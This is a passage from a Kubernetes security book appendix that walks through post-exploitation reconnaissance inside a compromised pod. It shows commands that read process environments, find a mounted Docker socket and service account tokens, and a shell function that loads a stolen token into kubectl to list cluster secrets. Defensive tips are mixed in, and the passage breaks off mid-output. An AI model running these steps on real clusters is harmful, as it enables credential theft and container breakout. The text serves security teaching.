<html><head></head><body><div id="sbo-rt-content"><section data-type="appendix" epub:type="appendix" data-pdf-bookmark="Appendix A. A Pod-Level Attack"><div class="appendix" id="appendix-pod-attack">
<h1><span class="label">Appendix A. </span>A Pod-Level Attack</h1>


<p>This appendix is a hands-on exploration of attacks on the pod level, as
we discussed in <a data-type="xref" href="ch02.xhtml#ch-pod-level-resources">Chapter 2</a>.</p>
<div class="clear">
<figure class="informal no-frame width-35"><div id="captainappa" class="figure">
<img src="Images/haku_0000.png" alt="captain" width="1086" height="1103"/>
<h6/>
</div></figure>
<p>Dread cyberpirate Captain Hashjack can now execute code inside a pod remotely and they will start to explore its configuration to see what else can be accessed.</p>

<p>Like all good pirates, Captain Hashjack has a treasure map, but this is no ordinary map with a clearly defined destination. Instead, this map describes only the journey, with no guarantee of reaching a conclusion. It’s a cluster attack map, as shown in <a data-type="xref" href="#pod-attack-map">Figure A-1</a>, and it is used to guide us through the rest of the appendix. And now, from inside the pod, it’s time to explore.</p>
</div>
<div data-type="tip"><h6>Tip</h6>
<p>Securing any system is difficult. The best way to find vulnerabilities and misconfiguration is to
methodically observe your environment, build up a library of your own attacks and patterns, and not give up!</p>
</div>

<figure><div id="pod-attack-map" class="figure">
<img src="Images/haku_aa01.png" alt="Pod Attack map" width="1444" height="1527"/>
<h6><span class="label">Figure A-1. </span>Pod attack map</h6>
</div></figure>






<section data-type="sect1" data-pdf-bookmark="Filesystem"><div class="sect1" id="idm45302807132592">
<h1>Filesystem</h1>

<p>Upon<a data-type="indexterm" data-primary="pods" data-secondary="attack map" id="idm45302807130352"/> entering a new environment, a little basic checking may lead to useful discoveries.
The first thing Hashjack does is check to see what kind of <a data-type="indexterm" data-primary="containers" data-secondary="identifying" id="idm45302807129088"/>container they’re in. Checking <code>/proc/self/cgroup</code> often
gives<a data-type="indexterm" data-primary="/proc/self/cgroup" data-primary-sortas="proc/self/cgroup" id="idm45302807127600"/> a clue, and here they can see they’re in Kubernetes from the clue <code>/kubepods/besteffort/pod8a6fa26b-...</code>:</p>

<pre data-type="programlisting" data-code-language="bash">adversary@hashjack-5ddf66bb7b-9sssx:/<code class="nv">$ </code>cat /proc/self/cgroup
11:memory:/kubepods/besteffort/pod8a6fa26b-.../f3d7b09d9c3a1ab10cf88b3956...
10:cpu,cpuacct:/kubepods/besteffort/pod8a6fa26b-...f3d7b09d9c3a1ab10cf88b...
9:blkio:/kubepods/besteffort/pod8a6fa26b-...f3d7b09d9c3a1ab10cf88b3956704...
8:net_cls,net_prio:/kubepods/besteffort/pod8a6fa26b-...f3d7b09d9c3a1ab10c...
7:perf_event:/kubepods/besteffort/pod8a6fa26b-...f3d7b09d9c3a1ab10cf88b39...
6:freezer:/kubepods/besteffort/pod8a6fa26b-...f3d7b09d9c3a1ab10cf88b39567...
5:pids:/kubepods/besteffort/pod8a6fa26b-...f3d7b09d9c3a1ab10cf88b39567048...
4:cpuset:/kubepods/besteffort/pod8a6fa26b-...f3d7b09d9c3a1ab10cf88b395670...
3:hugetlb:/kubepods/besteffort/pod8a6fa26b-...f3d7b09d9c3a1ab10cf88b39567...
2:devices:/kubepods/besteffort/pod8a6fa26b-...f3d7b09d9c3a1ab10cf88b39567...
1:name<code class="o">=</code>systemd:/kubepods/besteffort/pod8a6fa26b-...f3d7b09d9c3a1ab10cf88b...</pre>

<p>Next, they might check for <a data-type="indexterm" data-primary="capabilities" data-secondary="checking for" id="capa_chking"/>capabilities with their process’s status <a data-type="indexterm" data-primary="/proc/self/status" data-primary-sortas="proc/self/status" id="idm45302807121664"/>entry in <em>/proc/self/status</em>:</p>

<pre data-type="programlisting" data-code-language="text">Name:   cat
State:  R (running)
Tgid:   278
Ngid:   0
Pid:    278
PPid:   259
TracerPid:      0
Uid:    1001    1001    1001    1001
Gid:    0       0       0       0
FDSize: 256
Groups:
NStgid: 278
NSpid:  278
NSpgid: 278
NSsid:  259
VmPeak:     2432 kB
VmSize:     2432 kB
VmLck:         0 kB
VmPin:         0 kB
VmHWM:       752 kB
VmRSS:       752 kB
VmData:      312 kB
VmStk:       132 kB
VmExe:        28 kB
VmLib:      1424 kB
VmPTE:        24 kB
VmPMD:        12 kB
VmSwap:        0 kB
HugetlbPages:          0 kB
Threads:        1
SigQ:   0/15738
SigPnd: 0000000000000000
ShdPnd: 0000000000000000
SigBlk: 0000000000000000
SigIgn: 0000000000000000
SigCgt: 0000000000000000
CapInh: 00000000a80425fb
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000
Seccomp:        0
Speculation_Store_Bypass:       vulnerable
Cpus_allowed:   0003
Cpus_allowed_list:      0-1
Mems_allowed:   00000000,00000001
Mems_allowed_list:      0
voluntary_ctxt_switches:        0
nonvoluntary_ctxt_switches:     1</pre>

<p>The kernel freely provides this information in order to help Linux applications, and an attacker in a container can use
it to their advantage. Interesting entries can be grepped out (notice we’re root below):</p>

<pre data-type="programlisting" data-code-language="bash">root@hack:~ <code class="o">[</code>0<code class="o">]</code><code class="nv">$ </code>grep -E <code class="se">\</code>
  <code class="s1">'(Uid|CoreDumping|Seccomp|NoNewPrivs|Cap[A-Za-z]+):'</code> /proc/self/status
Uid:    <code class="m">0</code>       <code class="m">0</code>       <code class="m">0</code>       0
CoreDumping:    0
CapInh: 0000003fffffffff
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
NoNewPrivs:     0
Seccomp:        0</pre>

<p>The capabilities are not very readable, and need to be decoded:</p>

<pre data-type="programlisting" data-code-language="bash">root@hack:~ <code class="o">[</code>0<code class="o">]</code><code class="nv">$ </code>capsh --decode<code class="o">=</code>0000003fffffffff
<code class="nv">0x0000003fffffffff</code><code class="o">=</code>cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,
  cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,
  cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,
  cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,
  cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,
  cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,
  cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,
  cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read</pre>

<p>You can also use the <code>capsh --print</code> command to show capabilities (if it’s installed), <code>getpcaps</code> and <code>filecap</code> (for a single process or file, respectively), <code>pscap</code> (for all running processes), and <code>captest</code> (for the current process’s context):</p>

<pre data-type="programlisting" data-code-language="bash">root@hack:~ <code class="o">[</code>0<code class="o">]</code><code class="nv">$ </code>capsh --print
Current: <code class="o">=</code> cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,
  cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,
  cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip
Bounding <code class="nb">set</code> <code class="o">=</code>cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,
  cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,
  cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Ambient <code class="nb">set</code> <code class="o">=</code>
Securebits: 00/0x0/1<code class="err">'</code>b0
 secure-noroot: no <code class="o">(</code>unlocked<code class="o">)</code>
 secure-no-suid-fixup: no <code class="o">(</code>unlocked<code class="o">)</code>
 secure-keep-caps: no <code class="o">(</code>unlocked<code class="o">)</code>
 secure-no-ambient-raise: no <code class="o">(</code>unlocked<code class="o">)</code>
<code class="nv">uid</code><code class="o">=</code>0<code class="o">(</code>root<code class="o">)</code>
<code class="nv">gid</code><code class="o">=</code>0<code class="o">(</code>root<code class="o">)</code>
<code class="nv">groups</code><code class="o">=</code>1<code class="o">(</code>bin<code class="o">)</code>,2<code class="o">(</code>daemon<code class="o">)</code>,3<code class="o">(</code>sys<code class="o">)</code>,4<code class="o">(</code>adm<code class="o">)</code>,6<code class="o">(</code>disk<code class="o">)</code>,10<code class="o">(</code>wheel<code class="o">)</code>,11<code class="o">(</code>floppy<code class="o">)</code>...</pre>
<div data-type="tip"><h6>Tip</h6>
<p>A production container <a data-type="indexterm" data-primary="attacks" data-secondary="limiting access" id="idm45302806937168"/>should never contain these debugging commands, instead only containing
production applications and code. Using static, slim, or <code>distroless</code> containers
reduces the attack surface of a container by limiting an attacker’s access to useful information. This is also why you
should limit the availability of network-capable applications like <code>curl</code> and <code>wget</code> where possible, as well as any
interpreters with network libraries that can be used to pull external tools into a running container.</p>
</div>

<p>You may prefer to run Jess Frazelle’s <a href="https://oreil.ly/j919l">amicontained</a>, which runs <a data-type="indexterm" data-primary="amicontained" id="idm45302806933072"/>these checks quickly <a data-type="indexterm" data-primary="capabilities" data-secondary="checking for" data-startref="capa_chking" id="idm45302806932208"/>and also handily detects capability, seccomp, and LSM 
<span class="keep-together">configuration.</span></p>
<div data-type="tip"><h6>Tip</h6>
<p>This command requires internet access, which is another privilege that production workloads should not be afforded unless required for production operation. Air-gapped (fully offline) clusters<a data-type="indexterm" data-primary="air-gapped clusters" id="idm45302806929024"/><a data-type="indexterm" data-primary="clusters" data-secondary="air-gapped" id="idm45302806928320"/> afford greater security from this type of attack at the cost of administrative overhead.</p>
</div>

<p>Let’s use <code>amicontained</code>:</p>

<pre data-type="programlisting" data-code-language="bash"><code>root@hack:~</code><code> </code><code class="o">[</code><code>0</code><code class="o">]</code><code class="nv">$ </code><code class="nb">export  </code><code class="nv">AMICONTAINED_SHA256</code><code class="o">=</code><code class="s2">"d8c49e2cf44ee9668219acd092e\
d961fc1aa420a6e036e0822d7a31033776c9f"</code><code> </code><a class="co" id="co_a_pod_level_attack_CO1-1" href="#callout_a_pod_level_attack_CO1-1"><img src="Images/1.png" alt="1" width="12" height="12"/></a><code>

</code><code>root@hack:~</code><code> </code><code class="o">[</code><code>0</code><code class="o">]</code><code class="nv">$ </code><code>curl</code><code> </code><code>-fSL</code><code> </code><code class="se">\ </code><a class="co" id="co_a_pod_level_attack_CO1-2" href="#callout_a_pod_level_attack_CO1-2"><img src="Images/2.png" alt="2" width="12" height="12"/></a><code>
  </code><code class="s2">"https://github.com/genuinetools/amicontained/releases/download/v0.4.9/\
amicontained-linux-amd64"</code><code> </code><code class="se">\
</code><code>  </code><code>-o</code><code> </code><code class="s2">"/tmp/amicontained"</code><code> </code><code class="se">\
</code><code>  </code><code class="o">&amp;&amp;</code><code> </code><code class="nb">echo</code><code> </code><code class="s2">"</code><code class="si">${</code><code class="nv">AMICONTAINED_SHA256</code><code class="si">}</code><code class="s2">  /tmp/amicontained</code><code class="s2">"</code><code> </code><code class="p">|</code><code> </code><code>sha256sum</code><code> </code><code>-c</code><code> </code><code>-</code><code> </code><code class="se">\
</code><code>  </code><code class="o">&amp;&amp;</code><code> </code><code>chmod</code><code> </code><code>a+x</code><code> </code><code class="s2">"/tmp/amicontained"</code><code>



</code><code>root@hack:~</code><code> </code><code class="o">[</code><code>0</code><code class="o">]</code><code class="nv">$ </code><code>/tmp/amicontained</code><code> </code><a class="co" id="co_a_pod_level_attack_CO1-3" href="#callout_a_pod_level_attack_CO1-3"><img src="Images/3.png" alt="3" width="12" height="12"/></a><code>
</code><code>Container</code><code> </code><code>Runtime:</code><code> </code><code>kube</code><code>
</code><code>Has</code><code> </code><code>Namespaces:</code><code>
        </code><code>pid:</code><code> </code><code class="nb">true
        </code><code>user:</code><code> </code><code class="nb">false
</code><code>AppArmor</code><code> </code><code>Profile:</code><code> </code><code>docker-default</code><code> </code><code class="o">(</code><code>enforce</code><code class="o">)</code><code>
</code><code>Capabilities:</code><code>
        </code><code>BOUNDING</code><code> </code><code>-&gt;</code><code> </code><code>chown</code><code> </code><code>dac_override</code><code> </code><code>fowner</code><code> </code><code>fsetid</code><code> </code><code class="nb">kill </code><code>setgid</code><code> </code><code>setuid</code><code>
  </code><code>setpcap</code><code> </code><code>net_bind_service</code><code> </code><code>net_raw</code><code> </code><code>sys_chroot</code><code> </code><code>mknod</code><code> </code><code>audit_write</code><code> </code><code>setfcap</code><code>
</code><code>Seccomp:</code><code> </code><code>disabled</code><code>
</code><code>Blocked</code><code> </code><code>system</code><code> </code><code>calls</code><code> </code><code class="o">(</code><code>26</code><code class="o">)</code><code>:</code><code>
        </code><code>SYSLOG</code><code> </code><code>SETUID</code><code> </code><code>SETSID</code><code> </code><code>SETREUID</code><code> </code><code>SETGROUPS</code><code> </code><code>SETRESUID</code><code> </code><code>VHANGUP</code><code>
  </code><code>PIVOT_ROOT</code><code> </code><code>ACCT</code><code> </code><code>SETTIMEOFDAY</code><code> </code><code>UMOUNT2</code><code> </code><code>SWAPON</code><code> </code><code>SWAPOFF</code><code> </code><code>REBOOT</code><code> </code><code>SETHOSTNAME</code><code>
  </code><code>SETDOMAINNAME</code><code> </code><code>INIT_MODULE</code><code> </code><code>DELETE_MODULE</code><code> </code><code>LOOKUP_DCOOKIE</code><code> </code><code>KEXEC_LOAD</code><code>
  </code><code>FUTIMESAT</code><code> </code><code>UTIMENSAT</code><code> </code><code>FANOTIFY_INIT</code><code> </code><code>OPEN_BY_HANDLE_AT</code><code> </code><code>FINIT_MODULE</code><code>
  </code><code>KEXEC_FILE_LOAD</code><code>
</code><code>Looking</code><code> </code><code class="k">for</code><code> </code><code>Docker.sock</code></pre>
<dl class="calloutlist">
<dt><a class="co" id="callout_a_pod_level_attack_CO1-1" href="#co_a_pod_level_attack_CO1-1"><img src="Images/1.png" alt="1" width="12" height="12"/></a></dt>
<dd><p>Export the sha256sum for verification.</p></dd>
<dt><a class="co" id="callout_a_pod_level_attack_CO1-2" href="#co_a_pod_level_attack_CO1-2"><img src="Images/2.png" alt="2" width="12" height="12"/></a></dt>
<dd><p>Download and check the sha256sum.</p></dd>
<dt><a class="co" id="callout_a_pod_level_attack_CO1-3" href="#co_a_pod_level_attack_CO1-3"><img src="Images/3.png" alt="3" width="12" height="12"/></a></dt>
<dd><p>We installed to a non-standard path to evade immutable filesystems, so we run a fully-qualified path</p></dd>
</dl>

<p>Jackpot! There’s a lot of information available about the security configuration of a container—from within it.</p>

<p>We can check our <code>cgroup</code> limits on the filesystem too:</p>

<pre data-type="programlisting" data-code-language="bash">root@hack:~ <code class="o">[</code>0<code class="o">]</code><code class="nv">$ </code>free -m
        total   used   free   shared   buff/cache   available
Mem:     <code class="m">3950</code>    <code class="m">334</code>   <code class="m">1473</code>        <code class="m">6</code>         <code class="m">2142</code>        3327
Swap:       <code class="m">0</code>      <code class="m">0</code>      0</pre>

<p><code>free -m</code> uses host-level APIs available to all processes and has not been updated to run with <code>cgroups</code>. Check the system
API to see the process’s actual <code>cgroup</code> limits:</p>

<pre data-type="programlisting" data-code-language="bash">root@host:~ <code class="o">[</code>0<code class="o">]</code><code class="nv">$ </code>docker run -it --memory<code class="o">=</code>4MB sublimino/hack <code class="se">\</code>
  cat /sys/fs/cgroup/memory/memory.limit_in_bytes
4194304</pre>

<p>Is this tremendously useful to an attacker? Not really. Exhausting the memory of a process and causing <a data-type="indexterm" data-primary="DoS (denial of service)" id="idm45302806809808"/><a data-type="indexterm" data-primary="denial of service (DoS)" id="idm45302806809200"/><a data-type="indexterm" data-primary="attacks" data-secondary="DoS" id="idm45302806914176"/>denial of service
is a basic attack (although <a href="https://oreil.ly/pd9zR">fork bombs</a> are elegantly
scripted Bash poetry). Nevertheless, you should set <code>cgroups</code> to prevent DoS of applications in a
container or pod (which support individual configuration). Cgroups are not a security boundary, and cgroups v1 can be
escaped from a privileged pod, as nicely demonstrated in <a data-type="xref" href="#tweet-fel1x-cgroup-container-escape">Figure A-2</a>.</p>

<figure class="width-50"><div id="tweet-fel1x-cgroup-container-escape" class="figure">
<img src="Images/haku_aa02.png" alt="haku aa02" width="1236" height="1190"/>
<h6><span class="label">Figure A-2. </span>Felix Wilhelm’s cleverly tweet-sized <code>cgroups v1</code> container breakout</h6>
</div></figure>
<div data-type="tip"><h6>Tip</h6>
<p>The more secure, and rootless-prerequisite, <code>cgroups v2</code> should <a data-type="indexterm" data-primary="cgroups v2" id="idm45302806689296"/>be the default in most Linux installations
<a href="https://oreil.ly/9lOZa">from 2022</a>.</p>
</div>

<p>Denial of service is more likely to be an application fault than an attack—serious DDoS (internet-based distributed
denial of service) should be handled by networking equipment in front of the cluster for bandwidth and mitigation.</p>
<div data-type="note" epub:type="note"><h6>Note</h6>
<p>In September of 2017 Google fought off a
<a href="https://oreil.ly/zEUbp">2.54 Tbps DDoS</a>. This type of traffic is dropped by network router hardware at Ingress to prevent overwhelming internal systems.</p>
</div>

<p>Kubernetes sets some useful environment variables<a data-type="indexterm" data-primary="environment variables" id="idm45302806713184"/><a data-type="indexterm" data-primary="containers" data-secondary="environment variables" id="idm45302806712480"/> into each container in a pod:</p>

<pre data-type="programlisting" data-code-language="bash">root@frontened:/frontend <code class="o">[</code>0<code class="o">]</code><code class="nv">$ </code>env <code class="p">|</code>
  grep -E <code class="s1">'(KUBERNETES|[^_]SERVICE)_PORT='</code> <code class="p">|</code> sort
<code class="nv">ADSERVICE_PORT</code><code class="o">=</code>tcp://10.3.253.186:9555
<code class="nv">CARTSERVICE_PORT</code><code class="o">=</code>tcp://10.3.251.123:7070
<code class="nv">CHECKOUTSERVICE_PORT</code><code class="o">=</code>tcp://10.3.240.26:5050
<code class="nv">CURRENCYSERVICE_PORT</code><code class="o">=</code>tcp://10.3.240.14:7000
<code class="nv">EMAILSERVICE_PORT</code><code class="o">=</code>tcp://10.3.242.14:5000
<code class="nv">KUBERNETES_PORT</code><code class="o">=</code>tcp://10.3.240.1:443
<code class="nv">PAYMENTSERVICE_PORT</code><code class="o">=</code>tcp://10.3.248.231:50051
<code class="nv">PRODUCTCATALOGSERVICE_PORT</code><code class="o">=</code>tcp://10.3.250.74:3550
<code class="nv">RECOMMENDATIONSERVICE_PORT</code><code class="o">=</code>tcp://10.3.254.65:8080
<code class="nv">SHIPPINGSERVICE_PORT</code><code class="o">=</code>tcp://10.3.242.42:50051</pre>

<p>It is easy for an application to read its <a data-type="indexterm" data-primary="configuration" data-secondary="environment variables" id="idm45302806671184"/>configuration from environment variables, and the <a href="https://12factor.net">12 Factor App</a> suggests that config and Secrets should be set in the environment. Environment variables are not a safe
place to store Secrets as they can be read easily from the PID namespace by a process, user, or malicious code.</p>
<div data-type="tip"><h6>Tip</h6>
<p>You can see a process’s environment as root, or the same user. Check PID 1 with a null-byte translation:</p>

<pre data-type="programlisting" data-code-language="bash">root@frontened:/frontend <code class="o">[</code>0<code class="o">]</code><code class="nv">$ </code>tr <code class="s1">'\0'</code> <code class="s1">'\n'</code> &lt; /proc/1/environ
<code class="nv">HOSTNAME</code><code class="o">=</code>9c7e824ed321
<code class="nv">PWD</code><code class="o">=</code>/
<code class="c"># ...</code></pre>
</div>

<p>Even if no compromise takes place, many applications dump their environment when they crash, leaking Secrets to anyone
who can access the logging system.</p>

<p>Kubernetes Secrets should not be mounted as <a data-type="indexterm" data-primary="Secrets" data-secondary="environment variables and" id="idm45302806612544"/>environment variables.</p>
<div data-type="note" epub:type="note"><h6>Note</h6>
<p>As well as being easy to collect from a parent
process if an attacker has remote code execution, Kubernetes container environment variables are not updated after
container creation: if the Secret is updated by the API server, the environment variable keeps the same value.</p>
</div>

<p>The safer option is to use a well-known path, and <a data-type="indexterm" data-primary="Secrets" data-secondary="volumes, mounting" id="idm45302806609712"/>mount a Secret <code>tmpfs</code> volume into the container, so an adversary has
to guess or find the Secret file path, which is less likely to be automated by an attacker. Mounted Secrets are
updated automatically, after a <code>kubelet</code> sync period and cache propagation delay.</p>

<p>Here’s an example of a Secret mounted into the path <em>/etc/foo</em>:</p>

<pre data-type="programlisting" data-code-language="yaml"><code class="nt">apiVersion</code><code class="p">:</code> <code class="l-Scalar-Plain">v1</code>
<code class="nt">kind</code><code class="p">:</code> <code class="l-Scalar-Plain">Pod</code>
<code class="nt">metadata</code><code class="p">:</code>
  <code class="nt">name</code><code class="p">:</code> <code class="l-Scalar-Plain">mypod</code>
<code class="nt">spec</code><code class="p">:</code>
  <code class="nt">containers</code><code class="p">:</code>
  <code class="p-Indicator">-</code> <code class="nt">name</code><code class="p">:</code> <code class="l-Scalar-Plain">mypod</code>
    <code class="nt">image</code><code class="p">:</code> <code class="l-Scalar-Plain">redis</code>
    <code class="nt">volumeMounts</code><code class="p">:</code>
    <code class="p-Indicator">-</code> <code class="nt">name</code><code class="p">:</code> <code class="l-Scalar-Plain">foo</code>
      <code class="nt">mountPath</code><code class="p">:</code> <code class="s">"/etc/foo"</code>
      <code class="nt">readOnly</code><code class="p">:</code> <code class="l-Scalar-Plain">true</code>
  <code class="nt">volumes</code><code class="p">:</code>
  <code class="p-Indicator">-</code> <code class="nt">name</code><code class="p">:</code> <code class="l-Scalar-Plain">foo</code>
    <code class="nt">secret</code><code class="p">:</code>
      <code class="nt">secretName</code><code class="p">:</code> <code class="l-Scalar-Plain">mysecret</code></pre>

<p>Mounting Secrets as files protects against information leakage and ensures adversaries like Captain Hashjack don’t
stumble across production secrets when diving through stolen application logs.</p>
</div></section>













<section data-type="sect1" data-pdf-bookmark="tmpfs"><div class="sect1" id="idm45302807131616">
<h1>tmpfs</h1>

<p>A fastidious explorer leaves no sea uncharted, and to Captain Hashjack attacking the filesystem <a data-type="indexterm" data-primary="filesystems" data-secondary="attacking" id="idm45302806501360"/>is no different.
Checking for anything external added to the mount namespace is the first port of call, for which common tools like
<code>mount</code> and <code>df</code> can be used.</p>
<div data-type="tip"><h6>Tip</h6>
<p>Every external device, filesystem, socket, or entity shared into a container increases a risk of <a data-type="indexterm" data-primary="container breakouts" data-secondary="avoiding" id="idm45302806498256"/>container breakout
through exploit or misconfiguration. Containers are at their most secure when they contain only the bare essentials for
operation, and share nothing with each other or the underlying host.</p>
</div>

<p>Let’s start with a search of the filesystem <a data-type="indexterm" data-primary="filesystem" data-secondary="mount points, searching" id="fs_mp_serch"/>mount points for a common container filesystem driver, <code>overlayfs</code>. This may
leak information about the type of  container runtime that has configured the filesystem:</p>

<pre data-type="programlisting" data-code-language="bash">root@test-db-client-pod:~ <code class="o">[</code>0<code class="o">]</code><code class="nv">$ </code>mount <code class="p">|</code> grep overlay
overlay on / <code class="nb">type </code>overlay <code class="o">(</code>rw,relatime,
  <code class="nv">lowerdir</code><code class="o">=</code>
  /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/316/fs:
  /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/315/fs:
  /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/314/fs:
  /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/313/fs:
  /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/312/fs:
  /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/311/fs:
  /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/310/fs:
  /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/309/fs:
  /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/308/fs,
  <code class="nv">upperdir</code><code class="o">=</code>
  /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/332/fs,
  <code class="nv">workdir</code><code class="o">=</code>
  /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/332/work<code class="o">)</code></pre>

<p>We can see that the underlying container runtime is using a file path containing the name <code>containerd</code>, and the location
of the container’s filesystem on the host disk is
<em>/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/316/fs</em>. There are multiple layered directories
listed, and these are combined into a single filesystem at runtime by <code>overlayfs</code>.</p>

<p>These paths are fingerprints of the container runtime’s default configuration, and <code>runc</code> leaks its identity in the same
way, with a different filesystem layout:</p>

<pre data-type="programlisting" data-code-language="bash">root@dbe6633a6c94:/# mount <code class="p">|</code> grep overlay
overlay on / <code class="nb">type </code>overlay <code class="o">(</code>rw,relatime,lowerdir<code class="o">=</code>
  /var/lib/docker/overlay2/l/3PTJCBKLNC2V5MRAEF3AU6EDMS:
  /var/lib/docker/overlay2/l/SAJGPHO7UFXGYFRMGNJPUOXSQ5:
  /var/lib/docker/overlay2/l/4CZQ74RFDNSDSHQB6CTY6CLW7H,
  <code class="nv">upperdir</code><code class="o">=</code>
  /var/lib/docker/overlay2/aed7645f42335835a83f25ae7ab00b98595532224...163/diff,
  <code class="nv">workdir</code><code class="o">=</code>
  /var/lib/docker/overlay2/aed7645f42335835a83f25ae7ab00b98595532224...163/work<code class="o">)</code></pre>

<p>Run the <code>df</code> command to see if there are any Secrets mounted into the container. In this example no external entities are
mounted into the container:</p>

<pre data-type="programlisting" data-code-language="bash">root@test-db-client-pod:~ <code class="o">[</code>0<code class="o">]</code><code class="nv">$ </code>df
Filesystem     Type     Size  Used Avail Use% Mounted on
overlay        overlay   95G  6.6G   88G   7% /
tmpfs          tmpfs     64M     <code class="m">0</code>   64M   0% /dev
tmpfs          tmpfs    7.1G     <code class="m">0</code>  7.1G   0% /sys/fs/cgroup
/dev/sda1      ext4      95G  6.6G   88G   7% /etc/hosts
shm            tmpfs     64M     <code class="m">0</code>   64M   0% /dev/shm
tmpfs          tmpfs    7.1G     <code class="m">0</code>  7.1G   0% /proc/acpi
tmpfs          tmpfs    7.1G     <code class="m">0</code>  7.1G   0% /proc/scsi
tmpfs          tmpfs    7.1G     <code class="m">0</code>  7.1G   0% /sys/firmware</pre>

<p>We can see that <code>tmpfs</code> is used <a data-type="indexterm" data-primary="tmpfs" id="idm45302806405072"/>for many different mounts, and some mounts are masking host filesystems
in <em>/proc</em> and <code>/sys</code>. The container runtime performs additional masking on the special files in those directories.</p>

<p>Potentially interesting mounts in a vulnerable container filesytem may contain host mounted Secrets and sockets,
especially the infamous Docker socket, and Kubernetes service accounts that may have RBAC authorization to escalate
privilege, or enable further attacks:</p>

<pre data-type="programlisting" data-code-language="bash">root@test-db-client-pod:~ <code class="o">[</code>0<code class="o">]</code><code class="nv">$ </code>df
Filesystem  Type   ...  Use% Mounted on
tmpfs       tmpfs  ...    1% /etc/secret-volume
tmpfs       tmpfs  ...    1% /run/docker.sock
tmpfs       tmpfs  ...    1% /run/secrets/kubernetes.io/serviceaccount</pre>

<p>The easiest and most convenient of all <a data-type="indexterm" data-primary="container breakouts" id="idm45302806398016"/>container breakouts is the <em>/var/run/docker.sock</em> mount points: the container
runtime’s socket from the host, that gives access to the Docker daemon running on the host. If those new containers are
privileged, they can be used to trivially “escape” the container namespace and access the underlying host as root, as
we saw previously in this chapter.</p>

<p>Other appealing targets include the Kubernetes service account tokens under
<em>/var/run/secrets/kubernetes.io/serviceaccount</em>, or writable host mounted directories like <em>/etc/secret-volume</em>. Any
of these could lead to a breakout, or assist a pivot.</p>

<p>Everything a <code>kubelet</code> mounts into its containers is visible to the root user on the <code>kubelet</code>’s host. We’ll see what the
<code>serviceAccount</code> mounted at <em>/run/secrets/kubernetes.io/serviceaccount</em> looks like later, and we investigated what to do
with stolen <code>serviceAccount</code> credentials in <a data-type="xref" href="ch08.xhtml#ch-policy">Chapter 8</a>.</p>

<p>From within a pod <code>kubectl</code> uses the credentials in  <em>/run/secrets/kubernetes.io/serviceaccount</em> by default. From the <code>kubelet</code> host these files are mounted under <em>/var/lib/kubelet/pods/123e4567-e89b-12d3-a456-426614174000/volumes/kubernetes.io~secret/my-pod-token-7vzn2</em>, so load
the following command into a Bash shell:</p>

<pre data-type="programlisting" data-code-language="shell">kubectl-sa-dir <code class="o">()</code> <code class="o">{</code>
    <code class="nb">local </code><code class="nv">DIR</code><code class="o">=</code><code class="s2">"</code><code class="si">${</code><code class="nv">1</code><code class="k">:-</code><code class="si">}</code><code class="s2">"</code><code class="p">;</code>
    <code class="nb">local </code><code class="nv">API_SERVER</code><code class="o">=</code><code class="s2">"</code><code class="si">${</code><code class="nv">2</code><code class="k">:-</code><code class="nv">kubernetes</code><code class="p">.default</code><code class="si">}</code><code class="s2">"</code><code class="p">;</code>
    kubectl config <code class="nb">set</code>-cluster tmpk8s --server<code class="o">=</code><code class="s2">"https://</code><code class="si">${</code><code class="nv">API_SERVER</code><code class="si">}</code><code class="s2">"</code> <code class="se">\</code>
      --certificate-authority<code class="o">=</code><code class="s2">"</code><code class="si">${</code><code class="nv">DIR</code><code class="si">}</code><code class="s2">/ca.crt"</code><code class="p">;</code>
    kubectl config <code class="nb">set</code>-context tmpk8s --cluster<code class="o">=</code>tmpk8s<code class="p">;</code>
    kubectl config <code class="nb">set</code>-credentials tmpk8s --token<code class="o">=</code><code class="s2">"</code><code class="k">$(</code>&lt;<code class="si">${</code><code class="nv">DIR</code><code class="si">}</code>/token<code class="k">)</code><code class="s2">"</code><code class="p">;</code>
    kubectl config <code class="nb">set</code>-context tmpk8s --user<code class="o">=</code>tmpk8s<code class="p">;</code>
    kubectl config use-context tmpk8s<code class="p">;</code>
    kubectl get secrets -n null 2&gt;<code class="p">&amp;</code><code class="m">1</code> <code class="p">|</code> sed -E <code class="s1">'s,.*r "([^"]+).*,\1,g'</code>
<code class="o">}</code></pre>

<p>And run it against a directory:</p>

<pre data-type="programlisting">root@kube-node-1:~ [0]# kubectl-sa-dir \
  /var/lib/kubelet/pods/.../kubernetes.io~secret/priv-app-r4zkx/...229622223/
Cluster "tmpk8s" set.
Context "tmpk8s" created.
User "tmpk8s" set.
Context "tmpk8s" modified.
Switched to context "tmpk8s".
apiVersion: v1
clusters:
- cluster:
    certificate-authority: \
